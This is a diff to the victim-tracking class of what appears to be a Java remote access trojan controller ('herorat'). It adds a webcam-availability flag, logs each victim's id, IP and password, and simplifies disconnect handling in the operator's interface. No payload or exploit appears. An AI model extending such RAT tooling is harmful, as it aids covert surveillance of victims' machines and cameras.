@@ -50,6 +50,8 @@ import net.herorat.network.Packet9Process;
 import net.herorat.utils.Crypto;
 import net.herorat.utils.Logger;
 
+import javax.swing.tree.DefaultMutableTreeNode;
+
 
 public class Server extends Thread
 {
@@ -62,6 +64,7 @@ public class Server extends Thread
 	private String ping = "999";
 	private String comment;
 	private String password;
+	private boolean hasCam;
 	
 	public Socket socket;
 	private InputStream input;
@@ -107,6 +110,7 @@ public class Server extends Thread
 	
 	private void parse(String data)
 	{
+		Logger.log("Got: '%s' from the server\n",data);
 		String[] params = data.split("###");
 		
 		id = params[0];
@@ -114,8 +118,9 @@ public class Server extends Thread
 		name = params[2];
 		os = params[3];
 		timestamp_start = params[4];
-		password = params[5];
-//		Logger.log("id: %s \nip: %s \nPass: %s\n", this.id,this.ip,this.password);
+		hasCam = params[5].equals("true");
+		password = params[6];
+		Logger.log("id: %s \nip: %s \npass: %s\n",new Object[] {this.id,this.ip,this.password});
 	}
 	
 	public void setPing(long delay)
@@ -158,6 +163,11 @@ public class Server extends Thread
 		return os;
 	}
 	
+	public boolean hasCam()
+	{
+		return hasCam;
+	}
+	
 	public String getUptime()
 	{
 		long ms = new Date().getTime() - Long.parseLong(timestamp_start);
@@ -172,7 +182,11 @@ public class Server extends Thread
 	{
 		return ping;
 	}
-	
+
+	public String toString(){
+        return getIp()+" ("+getUptime()+")";
+    }
+
 	public String[] getRowData()
 	{
 		Ping.send(this);
@@ -181,144 +195,13 @@ public class Server extends Thread
 	
 	public void disconnect()
 	{
-		Logger.log("[%s] Connection being closed\n",this.id);
-		for (int i=0; i<Main.mainWindow.panel_tab2.model_servers.getRowCount(); i++)
-		{
-			if (Main.mainWindow.panel_tab2.model_servers.getValueAt(i, 6).toString().equalsIgnoreCase(this.getUid()))
-			{
-				Main.mainWindow.panel_tab2.model_servers.removeRow(i);
-			}
-		}
-		
-		int pos = Network.getServerPositionInList(this);
-		try{
-			if (pos > 0)
-			{
-				Main.mainWindow.panel_tab3.combo_select.removeItemAt(pos);
-				Main.mainWindow.panel_tab4.combo_select.removeItemAt(pos);
-				Main.mainWindow.panel_tab5.combo_select.removeItemAt(pos);
-				Main.mainWindow.panel_tab6.combo_select.removeItemAt(pos);
-				Main.mainWindow.panel_tab7.combo_select.removeItemAt(pos);
-				Main.mainWindow.panel_tab8.combo_select.removeItemAt(pos);
-				Main.mainWindow.panel_tab9.combo_select.removeItemAt(pos);
-				Main.mainWindow.panel_tab10.combo_select.removeItemAt(pos);
-				Main.mainWindow.panel_tab11.combo_select.removeItemAt(pos);
-				Main.mainWindow.panel_tab12.combo_select.removeItemAt(pos);
-			}
-			
-			if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab3.combo_selected_item)))
-			{
-				Main.mainWindow.panel_tab3.combo_selected_item = "";
-				Main.mainWindow.panel_tab3.combo_select.setSelectedIndex(0);
-			}
-			else
-			{
-				pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab3.combo_selected_item));
-				Main.mainWindow.panel_tab3.combo_select.setSelectedIndex(pos);
-			}
-			
-			if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab4.combo_selected_item)))
-			{
-				Main.mainWindow.panel_tab4.combo_selected_item = "";
-				Main.mainWindow.panel_tab4.combo_select.setSelectedIndex(0);
-			}
-			else
-			{
-				pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab4.combo_selected_item));
-				Main.mainWindow.panel_tab4.combo_select.setSelectedIndex(pos);
-			}
-			
-			if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab5.combo_selected_item)))
-			{
-				Main.mainWindow.panel_tab5.combo_selected_item = "";
-				Main.mainWindow.panel_tab5.combo_select.setSelectedIndex(0);
-			}
-			else
-			{
-				pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab5.combo_selected_item));
-				Main.mainWindow.panel_tab5.combo_select.setSelectedIndex(pos);
-			}
-			
-			if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab6.combo_selected_item)))
-			{
-				Main.mainWindow.panel_tab6.combo_selected_item = "";
-				Main.mainWindow.panel_tab6.combo_select.setSelectedIndex(0);
-			}
-			else
-			{
-				pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab6.combo_selected_item));
-				Main.mainWindow.panel_tab6.combo_select.setSelectedIndex(pos);
-			}
-			
-			if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab7.combo_selected_item)))
-			{
-				Main.mainWindow.panel_tab7.combo_selected_item = "";
-				Main.mainWindow.panel_tab7.combo_select.setSelectedIndex(0);
-			}
-			else
-			{
-				pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab7.combo_selected_item));
-				Main.mainWindow.panel_tab7.combo_select.setSelectedIndex(pos);
-			}
-			
-			if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab8.combo_selected_item)))
-			{
-				Main.mainWindow.panel_tab8.combo_selected_item = "";
-				Main.mainWindow.panel_tab8.combo_select.setSelectedIndex(0);
-			}
-			else
-			{
-				pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab8.combo_selected_item));
-				Main.mainWindow.panel_tab8.combo_select.setSelectedIndex(pos);
-			}
-			
-			if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab9.combo_selected_item)))
-			{
-				Main.mainWindow.panel_tab9.combo_selected_item = "";
-				Main.mainWindow.panel_tab9.combo_select.setSelectedIndex(0);
-			}
-			else
-			{
-				pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab9.combo_selected_item));
-				Main.mainWindow.panel_tab9.combo_select.setSelectedIndex(pos);
-			}
-			
-			if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab10.combo_selected_item)))
-			{
-				Main.mainWindow.panel_tab10.combo_selected_item = "";
-				Main.mainWindow.panel_tab10.combo_select.setSelectedIndex(0);
-			}
-			else
-			{
-				pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab10.combo_selected_item));
-				Main.mainWindow.panel_tab10.combo_select.setSelectedIndex(pos);
-			}
-			
-			if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab11.combo_selected_item)))
-			{
-				Main.mainWindow.panel_tab11.combo_selected_item = "";
-				Main.mainWindow.panel_tab11.combo_select.setSelectedIndex(0);
-			}
-			else
-			{
-				pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab11.combo_selected_item));
-				Main.mainWindow.panel_tab11.combo_select.setSelectedIndex(pos);
-			}
-			
-			if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab12.combo_selected_item)))
-			{
-				Main.mainWindow.panel_tab12.combo_selected_item = "";
-				Main.mainWindow.panel_tab12.combo_select.setSelectedIndex(0);
-			}
-			else
-			{
-				pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab12.combo_selected_item));
-				Main.mainWindow.panel_tab12.combo_select.setSelectedIndex(pos);
-			}
-		}catch(Exception e){
-			e.printStackTrace();
-		}
-		
+		Logger.log("[%s] Connection being closed\n",this.ip);
+        DefaultMutableTreeNode node = Main.mainWindow.ServerStatusTree.findOnlineObject(this);
+
+        if(node != null){
+            Main.mainWindow.ServerStatusTree.removeOnlineObject(node);
+        }
+
 		try
 		{
 			this.inputstream.close();
@@ -343,7 +226,7 @@ public class Server extends Thread
 			{
 				Packet packet;
 				int packet_id = inputstream.readInt();
-				Logger.log("Packet ID: %d\n",packet_id);				
+				Logger.log("Packet ID: %d\n",packet_id);
 				switch (packet_id)
 				{
 					case 1:
@@ -421,6 +304,7 @@ public class Server extends Thread
 			}
 			catch (Exception e)
 			{
+//				e.printStackTrace();
 				this.disconnect();
 				return;
 			}
